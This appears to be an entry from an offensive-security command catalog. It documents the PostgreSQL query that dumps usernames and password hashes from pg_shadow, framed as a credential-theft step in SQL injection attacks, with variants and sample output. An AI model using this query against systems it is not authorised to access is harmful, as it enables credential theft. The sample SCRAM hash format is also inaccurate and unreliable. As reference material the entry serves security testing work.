---
id: d40363d9-c0d9-4f2d-a7cc-c2863afe3379
name: postgresql-select-usename-passwd-from-pg_shadow
type: command
executor: sql
data: 'SELECT usename, passwd FROM pg_shadow'
output: null
created_at: '2023-04-06T03:56:35.516824+00:00'
updated_at: '2023-04-10T20:23:12.841372+00:00'
platforms:
  - Database
tags:
  - postgresql
  - sql-injection
  - credential-access
verified: true
validated: true
---

# postgresql-select-usename-passwd-from-pg_shadow

## Command

```sql
SELECT usename, passwd FROM pg_shadow
```

## Description

This SQL command queries the PostgreSQL system catalog table pg_shadow to retrieve usernames and their corresponding password hashes. It is typically used in SQL injection scenarios to dump credential data from vulnerable web applications. The command requires SELECT privileges on pg_shadow, often available if the application connects as a superuser.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| usename | Column for PostgreSQL usernames (e.g., 'postgres', 'appuser') | Built-in |
| passwd | Column for hashed passwords (MD5 or SCRAM-SHA-256 format) | Built-in |

No additional parameters; this is a direct SELECT without WHERE clause to dump all entries.

## Examples

### Basic Usage

```sql
SELECT usename, passwd FROM pg_shadow;
```

Returns all user credentials.

### Limited Usage

```sql
SELECT usename, passwd FROM pg_shadow LIMIT 10;
```

Restricts output to first 10 entries for testing.

## Expected Output

A result set with two columns:

```
 usename  | passwd
----------+------------------------------------------------
 postgres | md5d41d8cd98f00b204e9800998ecf8427e
 appuser  | scram-sha-256:iterations=4096:salt=ABC123:...
```

Success is indicated by rows returned without errors. Empty results may mean no password-protected users or insufficient privileges.

## Related

- [[procedures/PostgreSQL-Password-Hash-Extraction-via-SQL-Injection]]
- [[techniques/Exploitation of Remote Services|T1210]]
